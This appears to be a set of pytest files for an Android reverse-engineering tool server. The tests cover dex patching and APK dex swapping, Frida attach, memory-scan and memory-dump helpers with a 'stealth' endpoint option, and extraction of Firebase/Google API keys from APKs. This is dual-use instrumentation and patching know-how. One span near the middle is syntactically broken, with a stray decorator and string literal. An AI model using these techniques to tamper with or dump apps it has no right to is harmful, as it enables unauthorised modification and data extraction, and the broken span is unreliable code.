`python/tests/test_dex_tools.py`:

```py
"""Hermetic + jar-gated tests for the E-PY-17 dex surgery tools.

The dexfile-cli jar (~/tools/dexfile-cli.jar) gates the real round-trip
net (assemble → info → patch → convert), mirroring how the quark tests
skip without the engine. Everything else — ops validation, missing-tool
honesty, .bak discipline, the caps logic, and the pure-Python dex_swap —
runs with fakes only.
"""

import json
import os
import zipfile
from pathlib import Path

import pytest

from android_re_mcp.handlers import dex as dex_mod
from android_re_mcp.handlers.dex import DexHandler

# captured before the autouse isolated_env fixture repoints HOME per test
REAL_TOOLS_DIR = os.environ.get("ANDROID_RE_MCP_TOOLS_DIR") or str(Path.home() / "tools")

FIXTURE_SMALI = """.class public Lcom/poc/Loader;
.super Ljava/lang/Object;

.method public static getMessage()Ljava/lang/String;
    .locals 1

    const-string v0, "hello-original"

    return-object v0
.end method
"""

JAR_AVAILABLE = (Path(REAL_TOOLS_DIR) / dex_mod._JAR_NAME).is_file() and dex_mod.shutil.which("java") is not None

ROUNDTRIP = pytest.mark.skipif(not JAR_AVAILABLE, reason="dexfile-cli.jar / java not available")


@pytest.fixture
def real_tools(monkeypatch):
    """Jar-gated tests run against the real ~/tools (the autouse fixture repoints HOME)."""
    monkeypatch.setenv("ANDROID_RE_MCP_TOOLS_DIR", REAL_TOOLS_DIR)


@pytest.fixture
def fake_tools(tmp_path, monkeypatch):
    """Point tools_dir at an empty dir → every tool reports missing_tool."""
    monkeypatch.setattr(dex_mod, "tools_dir", lambda: tmp_path / "empty-tools")
    return tmp_path


@pytest.fixture
def fake_run(monkeypatch):
    """Fake the CLI runner: success with a canned result, recording argv + ops content."""
    calls = {}
    # The patch/convert handlers now check the jar before side effects; a
    # faked _run alone would still hit the isolated HOME's empty tools dir.
    monkeypatch.setattr(
        DexHandler, "_require", staticmethod(lambda tool: ("/fake/dexfile-cli.jar", "/fake/java"))
    )

    def fake(tool, cli_args):
        calls["tool"] = tool
        calls["cli_args"] = cli_args
        calls["ops_json"] = None
        if "--ops" in cli_args:
            ops_file = cli_args[cli_args.index("--ops") + 1]
            calls["ops_json"] = json.loads(Path(ops_file).read_text())
        return {"status": "ok", "tool": tool, "result": {"out": "fake"}}

    monkeypatch.setattr(DexHandler, "_run", staticmethod(fake))
    return calls


# ── missing_tool honesty (all seven) ──────────────────────────────────────

def test_all_tools_missing_without_jar(fake_tools, tmp_path):
    h = DexHandler()
    smali = tmp_path / "x.smali"
    smali.write_text(FIXTURE_SMALI)
    cases = [
        ("dex_info", {"dex_path": str(tmp_path / "a.dex")}),
        ("dex_extract", {"apk_path": str(tmp_path / "a.apk")}),
        ("dex_convert", {"in_path": str(tmp_path / "a.dex")}),
        ("dex_patch", {"dex_path": str(tmp_path / "a.dex"), "ops": [{"op": "rename", "target": "class", "class": "a.B", "new_name": "a.C"}]}),
        ("dex_assemble", {"smali_text": FIXTURE_SMALI}),
        ("dex_split", {"dex_path": str(tmp_path / "a.dex")}),
        ("dex_swap", {"apk_path": str(tmp_path / "a.apk"), "dex_path": str(tmp_path / "a.dex")}),
    ]
    for tool, args in cases[:6]:  # dex_swap is pure Python — no jar needed
        result = getattr(h, tool)(args)
        assert result["status"] == "missing_tool", tool
        assert "--setup" in result["hint"] or "install_tool" in result["hint"] or "java" in result["error"]


def test_dex_swap_needs_no_jar(tmp_path):
    # the zip rewrite is stdlib — it works even when the jar is absent
    apk = tmp_path / "app.apk"
    with zipfile.ZipFile(apk, "w") as z:
        z.writestr("AndroidManifest.xml", "<manifest/>")
        z.writestr("classes.dex", b"\x00old-dex-bytes")
    patched = tmp_path / "classes.dex"
    patched.write_bytes(b"\x00new-dex-bytes")
    out = DexHandler().dex_swap({"apk_path": str(apk), "dex_path": str(patched)})
    assert out["status"] == "ok"
    with zipfile.ZipFile(apk) as z:
        assert z.read("classes.dex") == b"\x00new-dex-bytes"
        assert z.read("AndroidManifest.xml") == b"<manifest/>"  # other entries byte-identical


def test_dex_swap_preserves_entry_compression(tmp_path):
    # resources.arsc must stay STORED (uncompressed) or modern Android refuses it
    apk = tmp_path / "app.apk"
    with zipfile.ZipFile(apk, "w") as z:
        z.writestr("AndroidManifest.xml", "<manifest/>")  # default DEFLATED
        stored = zipfile.ZipInfo("resources.arsc")
        stored.compress_type = zipfile.ZIP_STORED
        z.writestr(stored, b"\x00arsc-bytes")
        z.writestr("classes.dex", b"\x00old")
    patched = tmp_path / "classes.dex"
    patched.write_bytes(b"\x00new")
    out = DexHandler().dex_swap({"apk_path": str(apk), "dex_path": str(patched)})
    assert out["status"] == "ok"
    with zipfile.ZipFile(apk) as z:
        assert z.getinfo("resources.arsc").compress_type == zipfile.ZIP_STORED
        assert z.read("resources.arsc") == b"\x00arsc-bytes"
        assert z.read("classes.dex") == b"\x00new"


# ── ops validation (hermetic) ─────────────────────────────────────────────

def test_ops_validation_rejects_unknown_op():
    err = DexHandler._validate_ops([{"op": "delete-everything"}])
    assert err and "replace-const-string" in err  # names the valid set


def test_ops_validation_rejects_missing_fields():
    err = DexHandler._validate_ops([{"op": "replace-const-string", "old": "a"}])
    assert err and "new" in err


def test_ops_validation_rejects_bad_flags():
    err = DexHandler._validate_ops([{"op": "flip-flags", "class": "a.B", "set": ["NOT_A_FLAG"]}])
    assert err and "PUBLIC" in err


def test_ops_validation_accepts_all_supported():
    ops = [
        {"op": "replace-const-string", "old": "a", "new": "b"},
        {"op": "rename", "target": "class", "class": "a.B", "new_name": "a.C"},
        {"op": "rename", "target": "method", "class": "a.B", "name": "m", "new_name": "n"},
        {"op": "retarget-invoke", "class": "a.B", "name": "m", "to_class": "x.Y"},
        {"op": "flip-flags", "class": "a.B", "method": "m", "set": ["STATIC"], "clear": ["FINAL"]},
        {"op": "flip-flags", "class": "a.B", "set": ["0x1000"]},
        {"op": "replace-method-body", "class": "a.B", "method": "m", "smali": ".locals 0\\nreturn-void"},
    ]
    assert DexHandler._validate_ops(ops) is None


# ── .bak discipline + fast loop plumbing (hermetic, faked CLI) ────────────

def test_patch_writes_bak_once_and_passes_ops_file(fake_run, tmp_path):
    dex = tmp_path / "app.dex"
    dex.write_bytes(b"dex\n035\x00fake")
    h = DexHandler()
    ops = [{"op": "replace-const-string", "old": "a", "new": "b"}]

    first = h.dex_patch({"dex_path": str(dex), "ops": ops})
    assert first["status"] == "ok"
    bak = Path(str(dex) + ".bak")
    assert bak.exists() and bak.read_bytes() == b"dex\n035\x00fake"

    bak.write_bytes(b"modified-by-nothing")  # sentinel: second patch must NOT overwrite
    second = h.dex_patch({"dex_path": str(dex), "ops": ops})
    assert second["status"] == "ok"
    assert bak.read_bytes() == b"modified-by-nothing"

    # the ops file was written as JSON content (never a path argument to the guard);
    # the handler cleans it up afterwards, so the fake runner snapshots the content
    assert fake_run["tool"] == "dex_patch"
    assert fake_run["ops_json"] == ops


def test_patch_output_path_skips_bak(fake_run, tmp_path):
    dex = tmp_path / "app.dex"
    dex.write_bytes(b"data")
    out = tmp_path / "out.dex"
    result = DexHandler().dex_patch({"dex_path": str(dex), "ops": [{"op": "rename", "target": "class", "class": "a", "new_name": "b"}], "output_path": str(out)})
    assert result["status"] == "ok"
    assert not Path(str(dex) + ".bak").exists()
    assert "next_step" in result["result"]


def test_patch_missing_jar_does_not_write_bak(fake_tools, tmp_path):
    """A missing-tool call must not leave a .bak next to the input."""
    dex = tmp_path / "app.dex"
    dex.write_bytes(b"dex\n035\x00fake")
    result = DexHandler().dex_patch({
        "dex_path": str(dex),
        "ops": [{"op": "rename", "target": "class", "class": "a", "new_name": "b"}],
    })
    assert result["status"] == "missing_tool"
    assert not Path(str(dex) + ".bak").exists()

# ── convert default target (hermetic, faked CLI) ──────────────────────────

def test_convert_default_target_by_magic(fake_run, tmp_path):
    """vdex/cdex inputs default to 037 (API 28+ era); flat dex stays 035."""
    h = DexHandler()

    vdex = tmp_path / "base.vdex"
    vdex.write_bytes(b"vdex\x0010\x00" + b"\x00" * 16)
    out_v = h.dex_convert({"in_path": str(vdex)})
    args_v = fake_run["cli_args"]
    assert args_v[args_v.index("--to") + 1] == "037"
    assert "037" in out_v["note"] and "target_version" in out_v["note"]

    cdex = tmp_path / "base.cdex"
    cdex.write_bytes(b"cdex001\x00" + b"\x00" * 16)
    h.dex_convert({"in_path": str(cdex)})
    args_c = fake_run["cli_args"]
    assert args_c[args_c.index("--to") + 1] == "037"

    flat = tmp_path / "plain.dex"
    flat.write_bytes(b"dex\n035\x00" + b"\x00" * 16)
    h.dex_convert({"in_path": str(flat)})
    args_f = fake_run["cli_args"]
    assert args_f[args_f.index("--to") + 1] == "035"

    # an explicit target_version always wins, whatever the magic says
    h.dex_convert({"in_path": str(vdex), "target_version": "035"})
    args_e = fake_run["cli_args"]
    assert args_e[args_e.index("--to") + 1] == "035"

    # an unreadable/missing input must not crash the default pick
    version, note = DexHandler._default_target(str(tmp_path / "nope.vdex"))
    assert (version, note) == ("035", None)

# ── the real round-trip net (jar-gated — the upstream-safety net) ─────────

@ROUNDTRIP
def test_roundtrip_assemble_info_patch_convert(tmp_path, real_tools):
    h = DexHandler()
    smali = tmp_path / "Loader.smali"
    smali.write_text(FIXTURE_SMALI)

    assembled = h.dex_assemble({"path": str(smali), "output_path": str(tmp_path / "loader.dex")})
    assert assembled["status"] == "ok" and assembled["result"]["class"] == "com.poc.Loader"

    info = h.dex_info({"dex_path": str(tmp_path / "loader.dex")})
    assert info["result"]["version"] == "DEX035" and info["result"]["counts"]["classes"] == 1

    patched = h.dex_patch({
        "dex_path": str(tmp_path / "loader.dex"),
        "ops": [{"op": "replace-const-string", "old": "hello-original", "new": "hello-patched"}],
        "output_path": str(tmp_path / "loader-patched.dex"),
    })
    assert patched["status"] == "ok"
    assert patched["result"]["ops"][0]["matched"] == 1

    converted = h.dex_convert({"in_path": str(tmp_path / "loader-patched.dex"),
                               "target_version": "041",
                               "output_path": str(tmp_path / "loader.container")})
    assert converted["status"] == "ok"

    container_info = h.dex_info({"dex_path": str(tmp_path / "loader.container")})
    assert container_info["result"]["container"] is True


@ROUNDTRIP
def test_roundtrip_swap_into_apk(tmp_path, real_tools):
    h = DexHandler()
    smali = tmp_path / "Loader.smali"
    smali.write_text(FIXTURE_SMALI)
    h.dex_assemble({"path": str(smali), "output_path": str(tmp_path / "loader.dex")})

    apk = tmp_path / "app.apk"
    with zipfile.ZipFile(apk, "w") as z:
        z.writestr("AndroidManifest.xml", "<manifest/>")
        z.writestr("classes.dex", (tmp_path / "loader.dex").read_bytes())
    h.dex_patch({"dex_path": str(tmp_path / "loader.dex"),
                 "ops": [{"op": "replace-const-string", "old": "hello-original", "new": "hello-patched"}],
                 "output_path": str(tmp_path / "loader-patched.dex")})
    swapped = h.dex_swap({"apk_path": str(apk), "dex_path": str(tmp_path / "loader-patched.dex"),
                          "output_apk": str(tmp_path / "app-signed.apk")})
    assert swapped["status"] == "ok"
    with zipfile.ZipFile(tmp_path / "app-signed.apk") as z:
        assert z.read("classes.dex") == (tmp_path / "loader-patched.dex").read_bytes()
        assert z.read("AndroidManifest.xml") == b"<manifest/>"

@ROUNDTRIP

        ".class public Lcom/poc/Loader;\n.super Ljava/lang/Object;\n\n"

@ROUNDTRIP
def test_dex_merge_two_classes(tmp_path, real_tools):
    h = DexHandler()
    for name in ("Loader", "Second"):
        smali = tmp_path / f"{name}.smali"
        smali.write_text(
            f".class public Lcom/poc/{name};\n.super Ljava/lang/Object;\n")
        h.dex_assemble({"path": str(smali), "output_path": str(tmp_path / f"{name.lower()}.dex")})
    merged = h.dex_merge({
        "dex_paths": [str(tmp_path / "loader.dex"), str(tmp_path / "second.dex")],
        "output_path": str(tmp_path / "merged.dex")})["result"]
    assert merged["classes"] == 2
    info = h.dex_info({"dex_path": str(tmp_path / "merged.dex")})["result"]
    assert info["counts"]["classes"] == 2
    assert "split the inputs first" in merged["next_step"]

def test_cdex_and_validate_schemas_are_truthful():
    from android_re_mcp.server import TOOL_SCHEMAS

    by_name = {schema["name"]: schema for schema in TOOL_SCHEMAS}
    convert = by_name["dex_convert"]["inputSchema"]["properties"]
    assert "cdex001" in convert["target_version"]["enum"]
    # The handler chooses 037/035 from the input magic when the argument is
    # absent; a schema default of 035 would bypass that smart default.
    assert "default" not in convert["target_version"]
    assert "Omit for the smart default" in convert["target_version"]["description"]
    validate = by_name["dex_validate"]["inputSchema"]["properties"]
    assert "dex_path" in validate and "apk_path" not in validate

@ROUNDTRIP
def test_dex_validate_flags_super_interface_and_truncates(tmp_path, real_tools):
    h = DexHandler()
    smali_a = tmp_path / "A.smali"
    smali_a.write_text(
        ".class public interface abstract Lcom/poc/A;\n.super Ljava/lang/Object;\n")
    h.dex_assemble({"path": str(smali_a), "output_path": str(tmp_path / "a.dex")})
    paths = [str(tmp_path / "a.dex")]
    for name in ("B", "C"):
        smali = tmp_path / f"{name}.smali"
        smali.write_text(f".class public Lcom/poc/{name};\n.super Lcom/poc/A;\n")
        h.dex_assemble({"path": str(smali), "output_path": str(tmp_path / f"{name.lower()}.dex")})
        paths.append(str(tmp_path / f"{name.lower()}.dex"))
    h.dex_merge({"dex_paths": paths, "output_path": str(tmp_path / "all.dex")})
    out = h.dex_validate({"dex_path": str(tmp_path / "all.dex"), "max_issues": 1})["result"]
    assert out["ok"] is False
    assert out["issues_total"] == 2
    assert out["issues_shown"] == 1 and out["truncated"] is True
    assert out["issues"][0]["kind"] == "super_is_interface"
    assert "raise max_issues" in out["hint"]
```

`python/tests/test_frida_config_protocol.py`:

```py
"""Regression tests for the Frida config protocol (extension E-PY-6).

No device needed: a fake session/script records what the handler posts,
so the Python side of the protocol is testable hermetically.
"""

import queue
import sys
import types

import pytest

from android_re_mcp.handlers import dynamic as dynamic_mod


class _FakeScript:
    """Records the loaded source and any post() calls."""

    def __init__(self, src):
        self.src = src
        self.posted: list[dict] = []
        self.handlers: list[tuple[str, object]] = []
        self.loaded = False
        self.unloaded = False

    def on(self, event, handler):
        self.handlers.append((event, handler))

    def load(self):
        self.loaded = True

    def post(self, message):
        self.posted.append(message)

    def unload(self):
        self.unloaded = True


class _FakeSession:
    def __init__(self):
        self.created: list[_FakeScript] = []

    def create_script(self, src):
        script = _FakeScript(src)
        self.created.append(script)
        return script


@pytest.fixture()
def handler():
    h = dynamic_mod.DynamicHandler()
    h._frida_session = _FakeSession()
    return h


def test_run_script_posts_config_instead_of_patch(handler):
    """frida_run_script no longer str.replaces the source; it posts config."""
    calls: list[dict] = []
    original_spawn = dynamic_mod.DynamicHandler.frida_spawn

    def fake_spawn(self, args):
        calls.append(args)
        return {"status": "ok", "tool": "frida", "output": {"script_loaded": True}}

    dynamic_mod.DynamicHandler.frida_spawn = fake_spawn
    try:
        result = handler.frida_run_script(
            {
                "package": "com.example.app",
                "script_name": "memory_scan",
                "config": {"SEARCH_STRING": 'needle "with quotes"', "MAX_RESULTS": 5},
            }
        )
    finally:
        dynamic_mod.DynamicHandler.frida_spawn = original_spawn

    assert result["status"] == "ok"
    sent = calls[0]
    # The shipped source is untouched — the var-line contract stays intact.
    assert 'var SEARCH_STRING = "";' in sent["script"]
    assert 'needle "with quotes"' not in sent["script"]
    # The config travels as a first-class argument instead.
    assert sent["config"] == {"SEARCH_STRING": 'needle "with quotes"', "MAX_RESULTS": 5}


def test_load_script_posts_config_after_load(handler):
    handler._load_script("var X = 0;", config={"SEARCH_STRING": "abc"})
    script = handler._frida_session.created[0]
    assert script.loaded
    assert script.posted == [{"type": "config", "SEARCH_STRING": "abc"}]


def test_load_script_without_config_posts_nothing(handler):
    handler._load_script("var X = 0;")
    script = handler._frida_session.created[0]
    assert script.posted == []


def _completing_script(session):
    """A create_script that returns scripts firing scan_complete on load."""

    def create(src):
        script = _FakeScript(src)
        session.created.append(script)
        original_load = script.load

        def load_with_reply():
            original_load()
            for event, h in script.handlers:
                if event == "message":
                    h({"type": "send", "payload": {"type": "scan_complete",
                                                   "scanned_ranges": 1, "matches": 0}}, None)

        script.load = load_with_reply  # type: ignore[method-assign]
        return script

    return create


def test_find_bytes_uses_config_protocol(handler, monkeypatch):
    """frida_find_bytes loads unpatched and posts the search as config."""
    monkeypatch.setattr(
        handler._frida_session, "create_script",
        _completing_script(handler._frida_session)
    )

    result = handler.frida_find_bytes({"search_string": "token"})

    assert result["status"] == "ok"
    assert result["output"]["via"] == "config-protocol"
    script = handler._frida_session.created[0]
    # The shipped script is loaded UNPATCHED...
    assert 'var SEARCH_STRING = "";' in script.src
    # ...and the search arrives as a config message.
    assert script.posted == [{"type": "config", "SEARCH_STRING": "token",
                              "SEARCH_HEX": "", "MAX_RESULTS": 20}]


def test_find_bytes_falls_back_to_var_line_contract(handler, monkeypatch):
    """When script.post is unsupported, the var-line replace path still runs."""
    session = handler._frida_session

    def create(src):
        script = _FakeScript(src)
        session.created.append(script)
        original_load = script.load

        def boom(_msg):
            raise RuntimeError("no post in this runtime")

        def load_with_reply():
            original_load()
            for event, h in script.handlers:
                if event == "message":
                    h({"type": "send", "payload": {"type": "scan_complete",
                                                   "scanned_ranges": 1, "matches": 0}}, None)

        script.post = boom  # type: ignore[method-assign]
        script.load = load_with_reply  # type: ignore[method-assign]
        return script

    monkeypatch.setattr(session, "create_script", create)

    result = handler.frida_find_bytes({"search_string": "needle", "max_results": 7})
    assert result["status"] == "ok"
    assert result["output"]["pattern"] == "needle"
    # The fallback loaded a second, patched source.
    assert len(session.created) == 2
    patched = session.created[1]
    assert 'var SEARCH_STRING = "needle";' in patched.src
    assert 'var MAX_RESULTS = 7;' in patched.src


def test_find_bytes_requires_session():
    h = dynamic_mod.DynamicHandler()
    result = h.frida_find_bytes({"search_string": "x"})
    assert result["status"] == "error"
    assert "frida_attach" in result["error"]


# ── frida_memdump: per-range cap prevents device-side OOM (D-7) ──────────

def test_memdump_caps_range_size_and_reports_skips(handler, monkeypatch):
    """The dump script must embed the range cap and the summary reports skips."""
    session = handler._frida_session
    script_holder: list = []

    def create(src):
        script = _FakeScript(src)
        session.created.append(script)
        original_load = script.load

        def load_with_reply():
            original_load()
            for event, cb in script.handlers:
                if event == "message":
                    cb({"type": "send", "payload": {
                        "type": "done", "total_ranges": 760, "skipped_large": 6,
                    }}, None)

        script.load = load_with_reply  # type: ignore[method-assign]
        script_holder.append(script)
        return script

    monkeypatch.setattr(session, "create_script", create)
    handler._frida_session = session
    handler._attached_package = "com.example.app"

    result = handler.frida_memdump({})
    assert result["status"] == "ok"
    out = result["output"]
    assert out["skipped_large"] == 6
    assert out["total_ranges"] == 760
    assert out["max_range_mb"] == 32  # the new default cap
    src = script_holder[0].src
    assert "var MAX_RANGE = " in src and "skipped" in src
    assert "32 * 1024 * 1024" in src or str(32 * 1024 * 1024) in src

    custom = handler.frida_memdump({"max_range_mb": 8})
    assert custom["status"] == "ok"
    assert custom["output"]["max_range_mb"] == 8


def test_memdump_requires_session():
    h = dynamic_mod.DynamicHandler()
    result = h.frida_memdump({})
    assert result["status"] == "error"
    assert "frida_attach" in result["error"]

# ── D-6: attach by package identifier maps through enumerate_applications ──

class _FakeFridaDevice:
    def __init__(self, fail_by_name=True):
        self.fail_by_name = fail_by_name
        self.attached: list[object] = []

    def attach(self, target):
        if self.fail_by_name and isinstance(target, str):
            raise RuntimeError(f"unable to find process with name '{target}'")
        self.attached.append(target)
        return object()

    def enumerate_applications(self):
        return [
            types.SimpleNamespace(identifier="com.android.chrome", name="Chrome", pid=11),
            types.SimpleNamespace(identifier="com.termux.api", name="Termux:API", pid=28081),
        ]

    def enumerate_processes(self):
        return [
            types.SimpleNamespace(pid=1, name="Termux:API"),
            types.SimpleNamespace(pid=2, name="com.android.chrome"),
        ]


def test_attach_maps_package_identifier_to_pid(monkeypatch):
    """D-6: identifier attach fails on labels — the handler maps id → pid."""
    handler = dynamic_mod.DynamicHandler()
    device = _FakeFridaDevice()
    fake = types.ModuleType("frida")
    fake.get_usb_device = lambda timeout=10: device
    monkeypatch.setitem(sys.modules, "frida", fake)

    result = handler.frida_attach({"package": "com.termux.api"})
    assert result["status"] == "ok"
    assert device.attached == [28081], "must retry with the mapped pid"


def test_attach_direct_when_name_lookup_works(monkeypatch):
    """When frida's own lookup succeeds there is no second enumeration."""
    handler = dynamic_mod.DynamicHandler()
    device = _FakeFridaDevice(fail_by_name=False)
    fake = types.ModuleType("frida")
    fake.get_usb_device = lambda timeout=10: device
    monkeypatch.setitem(sys.modules, "frida", fake)

    result = handler.frida_attach({"package": "com.termux.api"})
    assert result["status"] == "ok"
    assert device.attached == ["com.termux.api"]


def test_attach_reports_failure_when_nothing_matches(monkeypatch):
    handler = dynamic_mod.DynamicHandler()

    class Dead(_FakeFridaDevice):
        def enumerate_applications(self):
            return []

    device = Dead()
    fake = types.ModuleType("frida")
    fake.get_usb_device = lambda timeout=10: device
    monkeypatch.setitem(sys.modules, "frida", fake)

    result = handler.frida_attach({"package": "com.notrunning.app"})
    assert result["status"] == "error"
    assert "unable to find process" in result["error"]


# ── ANDROID_RE_MCP_FRIDA_ENDPOINT: stealth servers on non-default ports ──

def test_frida_endpoint_env(monkeypatch):
    monkeypatch.delenv("ANDROID_RE_MCP_FRIDA_ENDPOINT", raising=False)
    assert dynamic_mod.frida_endpoint() is None
    monkeypatch.setenv("ANDROID_RE_MCP_FRIDA_ENDPOINT", "127.0.0.1:31337")
    assert dynamic_mod.frida_endpoint() == "127.0.0.1:31337"
    monkeypatch.setenv("ANDROID_RE_MCP_FRIDA_ENDPOINT", "   ")
    assert dynamic_mod.frida_endpoint() is None


def test_get_frida_device_uses_endpoint_when_set(monkeypatch):
    """Stealth setup: ANDROID_RE_MCP_FRIDA_ENDPOINT wins over USB discovery."""
    monkeypatch.setenv("ANDROID_RE_MCP_FRIDA_ENDPOINT", "127.0.0.1:31337")
    fake = types.ModuleType("frida")
    manager = types.SimpleNamespace(
        add_remote_device=lambda endpoint: f"remote:{endpoint}"
    )
    fake.get_device_manager = lambda: manager
    calls = []
    fake.get_usb_device = lambda timeout=10: calls.append(timeout) or "usb"
    monkeypatch.setitem(sys.modules, "frida", fake)

    assert dynamic_mod._get_frida_device() == "remote:127.0.0.1:31337"
    assert calls == [], "must not probe USB when an endpoint is configured"

    monkeypatch.delenv("ANDROID_RE_MCP_FRIDA_ENDPOINT")
    assert dynamic_mod._get_frida_device() == "usb"
```

```py
"""Regression tests for frida_status (extension E-PY-7).

No device needed: the fake frida module is injected into sys.modules, so
the device enumeration and responsiveness probe run hermetically.
"""

import sys
import types

import pytest

from android_re_mcp.handlers import dynamic as dynamic_mod


class _FakeDevice:
    def __init__(self, ident, name, dtype):
        self.id = ident
        self.name = name
        self.type = dtype

    def get_frontmost_application(self):
        if self.type == "usb":
            return types.SimpleNamespace(
                identifier="com.example.app", name="Example", pid=4321
            )
        raise RuntimeError("not a usb device")


@pytest.fixture()
def fake_frida(monkeypatch):
    mod = types.ModuleType("frida")
    mod.__version__ = "17.9.1-test"
    usb = _FakeDevice("f982678d", "CPH2487", "usb")
    local = _FakeDevice("local", "Local System", "local")
    mod.enumerate_devices = lambda: [local, usb]
    mod.get_usb_device = lambda timeout=5: usb
    monkeypatch.setitem(sys.modules, "frida", mod)
    return mod


def test_frida_status_missing_engine(monkeypatch):
    monkeypatch.setitem(sys.modules, "frida", None)  # forces ImportError
    result = dynamic_mod.DynamicHandler().frida_status({})
    assert result["status"] == "missing_tool"
    assert "frida" in result["error"]


def test_frida_status_detached_handler(fake_frida):
    """No session → session null, but device inventory still reported."""
    result = dynamic_mod.DynamicHandler().frida_status({})
    assert result["status"] == "ok"
    out = result["output"]
    assert out["frida_version"] == "17.9.1-test"
    assert [d["type"] for d in out["devices"]] == ["local", "usb"]
    assert out["usb_device"]["id"] == "f982678d"
    assert out["frida_server_responsive"] is True
    assert out["frontmost_application"]["identifier"] == "com.example.app"
    assert out["session"] is None


def test_frida_status_reports_handler_session(fake_frida):
    handler = dynamic_mod.DynamicHandler()
    session = types.SimpleNamespace(is_detached=False)
    handler._frida_session = session
    handler._attached_package = "com.example.app"
    handler._frida_script = object()
    handler._output_queue.put("msg")
    result = handler.frida_status({})
    session_info = result["output"]["session"]
    assert session_info == {
        "attached_package": "com.example.app",
        "alive": True,
        "script_loaded": True,
        "queued_messages": 1,
    }


def test_frida_status_survives_a_dead_server(fake_frida, monkeypatch):
    """If frida-server is down, status stays ok with responsive=False."""
    def refuse(timeout=5):
        raise RuntimeError("closed")

    monkeypatch.setattr(fake_frida, "get_usb_device", refuse)
    result = dynamic_mod.DynamicHandler().frida_status({})
    assert result["status"] == "ok"
    out = result["output"]
    assert out["frida_server_responsive"] is False
    assert "closed" in out["frida_server_error"]
    assert out["session"] is None


def test_frida_status_handles_old_session_objects(fake_frida):
    """Sessions without is_detached still report (alive defaults True)."""
    handler = dynamic_mod.DynamicHandler()
    handler._frida_session = object()  # no is_detached attribute
    result = handler.frida_status({})
    assert result["output"]["session"]["alive"] is True
    assert result["output"]["session"]["script_loaded"] is False


def test_frida_status_skips_device_probe_without_usb(fake_frida, monkeypatch):
    """No usb device in the list → no responsiveness probe at all."""
    monkeypatch.setattr(
        fake_frida, "enumerate_devices",
        lambda: [_FakeDevice("local", "Local System", "local")]
    )
    result = dynamic_mod.DynamicHandler().frida_status({})
    out = result["output"]
    assert out["usb_device"] is None
    assert out["frida_server_responsive"] is None
```

`python/tests/test_google_services.py`:

```py
"""Hermetic tests for android_google_services (PyPI port of the npm tool, E-PY-12).

Covers all three sources: the bundled google-services.json, the
smali_dir strings.xml path, and the resources.arsc Google-pattern scan.
The Google-pattern values here are built by concatenation so repo
scanners don't flag the test file itself.
"""

import json
import zipfile
from pathlib import Path

from android_re_mcp.handlers import googleservices as googleservices_mod
from android_re_mcp.handlers.googleservices import GoogleServicesHandler

FAKE_API_KEY = "AIza" + "x" * 35  # AIza + 35 chars, matches the pattern
FAKE_OAUTH_ID = "123456789012" + "a" * 32 + ".apps.googleusercontent.com"

GS_JSON = {
    "project_info": {
        "project_number": "123456789",
        "project_id": "notes-demo",
        "firebase_url": "https://notes-demo.firebaseio.com",
        "storage_bucket": "notes-demo.appspot.com",
    },
    "client": [
        {
            "client_info": {
                "mobilesdk_app_id": "1:123456789:android:abc123def456",
                "android_client_info": {"package_name": "com.example.notes"},
            },
            "services": {"api_key": [{"current_key": FAKE_API_KEY}]},
            "oauth_client": [{"client_id": FAKE_OAUTH_ID, "client_type": 1}],
        },
    ],
}

ARSC_BLOB = (
    b"\x00\x01\x02binarypadding"
    + FAKE_API_KEY.encode()
    + b"\x00\x00"
    + b"my-test-app.appspot.com\x00"
    + b"https://notes-demo-default-rtdb.firebaseio.com\x00"
)


def _write_apk(tmp_path: Path, name: str, files: dict[str, bytes]) -> str:
    apk_path = tmp_path / name
    with zipfile.ZipFile(apk_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for fname, data in files.items():
            zf.writestr(fname, data)
    return str(apk_path)


def _handler() -> GoogleServicesHandler:
    return GoogleServicesHandler()


def test_parses_bundled_google_services_json(tmp_path):
    apk = _write_apk(tmp_path, "app.apk", {
        "AndroidManifest.xml": b"stub",
        "assets/google-services.json": json.dumps(GS_JSON).encode(),
    })
    result = _handler().android_google_services({"apk_path": apk})
    assert result["status"] == "ok"
    gs = result["output"]["google_services_json"]
    assert gs["present"] is True
    assert gs["entry"] == "assets/google-services.json"
    assert gs["project_info"] == {
        "project_number": "123456789",
        "project_id": "notes-demo",
        "firebase_url": "https://notes-demo.firebaseio.com",
        "storage_bucket": "notes-demo.appspot.com",
    }
    assert gs["client_count"] == 1
    client = gs["clients"][0]
    assert client["package_name"] == "com.example.notes"
    assert client["app_id"] == "1:123456789:android:abc123def456"
    assert client["api_key"] == FAKE_API_KEY
    assert client["oauth_clients"] == [{"client_id": FAKE_OAUTH_ID, "client_type": 1}]


def test_finds_gs_json_at_alternate_location(tmp_path):
    apk = _write_apk(tmp_path, "app.apk", {
        "res/raw/notesdemo-google-services.json": json.dumps(GS_JSON).encode(),
    })
    result = _handler().android_google_services({"apk_path": apk})
    gs = result["output"]["google_services_json"]
    assert gs["present"] is True
    assert gs["entry"].endswith("google-services.json")
    assert gs["project_id" if "project_id" in gs else "project_info"]


def test_gs_json_missing_and_unparseable(tmp_path):
    handler = _handler()
    missing = _write_apk(tmp_path, "a.apk", {"AndroidManifest.xml": b"stub"})
    out = handler.android_google_services({"apk_path": missing})["output"]
    assert out["google_services_json"] == {"present": False, "note": "not found in APK assets"}

    broken = _write_apk(tmp_path, "b.apk", {
        "assets/google-services.json": b"{not json at all",
    })
    out = handler.android_google_services({"apk_path": broken})["output"]
    gs = out["google_services_json"]
    assert gs["present"] is True
    assert "could not parse google-services.json" in gs["parse_error"]


def test_strings_xml_via_smali_dir(tmp_path):
    smali = tmp_path / "decompiled"
    (smali / "res" / "values").mkdir(parents=True)
    (smali / "res" / "values" / "strings.xml").write_text(
        '<resources>\n'
        '  <string name="google_app_id">1:123456789:android:abc</string>\n'
        '  <string name="google_api_key" translatable="false">AIzAplaceholder</string>\n'
        '  <string name="Google_Storage_Bucket">  padded-bucket.appspot.com  </string>\n'
        '  <string name="unrelated_key">nothing here</string>\n'
        '</resources>\n'
    )
    apk = _write_apk(tmp_path, "app.apk", {"AndroidManifest.xml": b"stub"})
    result = _handler().android_google_services({"apk_path": apk, "smali_dir": str(smali)})
    out = result["output"]
    # the arsc scan must NOT run when smali_dir is given (npm returns early)
    assert "arsc_scan" not in out
    res = out["string_resources"]
    assert res["keys_checked"] == 10
    found = {(f["key"], f["value"]) for f in res["found"]}
    assert ("google_app_id", "1:123456789:android:abc") in found
    assert ("google_api_key", "AIzAplaceholder") in found
    # npm's regex is case-insensitive on the name attribute, values trimmed
    assert ("google_storage_bucket", "padded-bucket.appspot.com") in found
    assert all(k != "unrelated_key" for k, _ in found)


